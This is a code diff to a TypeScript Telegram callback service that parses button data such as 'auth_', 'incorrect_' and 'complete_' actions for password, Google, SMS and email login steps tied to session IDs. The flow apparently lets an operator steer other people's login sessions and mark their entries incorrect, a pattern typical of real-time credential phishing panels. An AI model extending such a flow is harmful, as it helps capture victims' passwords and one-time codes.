@@ -173,15 +173,44 @@ class TelegramCallbackService {
 
     const callbackData = callback.data;
 
-    // Parse callback data: auth_TYPE_SESSIONID
+    // Parse callback data: auth_TYPE_SESSIONID or incorrect_TYPE_SESSIONID or complete_auth_SESSIONID
     const parts = callbackData.split("_");
-    if (parts.length < 3) {
+    if (parts.length < 2) {
       console.error("❌ Invalid callback data format:", callbackData);
       return;
     }
 
-    const action = parts[1]; // password, google, sms, email, complete
-    const sessionId = parts.slice(2).join("_"); // Handle session IDs with underscores
+    let action: string;
+    let sessionId: string;
+
+    if (parts[0] === "auth") {
+      // Format: auth_TYPE_SESSIONID
+      if (parts.length < 3) {
+        console.error("❌ Invalid auth callback format:", callbackData);
+        return;
+      }
+      action = parts[1]; // password, google, sms, email
+      sessionId = parts.slice(2).join("_");
+    } else if (parts[0] === "incorrect") {
+      // Format: incorrect_TYPE_SESSIONID
+      if (parts.length < 3) {
+        console.error("❌ Invalid incorrect callback format:", callbackData);
+        return;
+      }
+      action = `incorrect_${parts[1]}`; // incorrect_password, incorrect_google, etc.
+      sessionId = parts.slice(2).join("_");
+    } else if (parts[0] === "complete") {
+      // Format: complete_auth_SESSIONID
+      if (parts.length < 3) {
+        console.error("❌ Invalid complete callback format:", callbackData);
+        return;
+      }
+      action = "complete";
+      sessionId = parts.slice(2).join("_");
+    } else {
+      console.error("❌ Unknown callback action:", callbackData);
+      return;
+    }
 
     console.log("🎯 Parsed callback:", { action, sessionId });
 
